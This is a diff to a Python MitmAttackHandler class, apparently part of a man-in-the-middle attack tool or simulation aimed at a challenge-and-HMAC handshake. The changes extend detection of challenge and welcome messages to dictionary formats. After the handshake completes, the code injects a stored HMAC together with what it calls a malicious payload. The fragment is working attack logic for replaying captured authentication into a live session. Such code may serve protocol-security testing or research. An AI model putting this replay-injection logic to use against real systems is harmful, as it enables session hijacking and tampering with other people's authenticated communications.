@@ -74,6 +74,12 @@ class MitmAttackHandler:
         elif isinstance(raw_msg, bytes):
             if b'#CHALLENGE#' in raw_msg:
                 challenge_detected = True
+        elif isinstance(raw_msg, dict):
+            # Check if it's a challenge message in dict format
+            if 'action' in raw_msg and raw_msg['action'] == 'challenge':
+                challenge_detected = True
+            elif 'type' in raw_msg and raw_msg['type'] == 'challenge':
+                challenge_detected = True
                 
         if challenge_detected:
             if not self.state['active']:
@@ -126,16 +132,26 @@ class MitmAttackHandler:
             return False
             
         # After handshake, inject malicious payload
-        elif self.state['active'] and self.state['phase'] == 'waiting_welcome' and isinstance(raw_msg, str) and raw_msg.startswith('#WELCOME#'):
-            if not self.state['injected'] and self.state['stored_hmac']:
-                if self.attack_log:
-                    logging.info(f"[MITM] *** Injecting stored HMAC and malicious payload after handshake ***")
-                writer.write(self.state['stored_hmac'])
-                await writer.drain()
-                if self.attack_log:
-                    logging.info(f"[MITM] Injected stored HMAC and malicious payload after handshake.")
-                self.state['injected'] = True
-            return True
+        elif self.state['active'] and self.state['phase'] == 'waiting_welcome':
+            welcome_detected = False
+            if isinstance(raw_msg, str) and raw_msg.startswith('#WELCOME#'):
+                welcome_detected = True
+            elif isinstance(raw_msg, dict):
+                if 'action' in raw_msg and raw_msg['action'] == 'welcome':
+                    welcome_detected = True
+                elif 'type' in raw_msg and raw_msg['type'] == 'welcome':
+                    welcome_detected = True
+                    
+            if welcome_detected:
+                if not self.state['injected'] and self.state['stored_hmac']:
+                    if self.attack_log:
+                        logging.info(f"[MITM] *** Injecting stored HMAC and malicious payload after handshake ***")
+                    writer.write(self.state['stored_hmac'])
+                    await writer.drain()
+                    if self.attack_log:
+                        logging.info(f"[MITM] Injected stored HMAC and malicious payload after handshake.")
+                    self.state['injected'] = True
+                return True
             
         # If we're in attack mode but haven't seen a challenge yet, just forward normally
         elif self.state['active'] and self.state['phase'] is None:
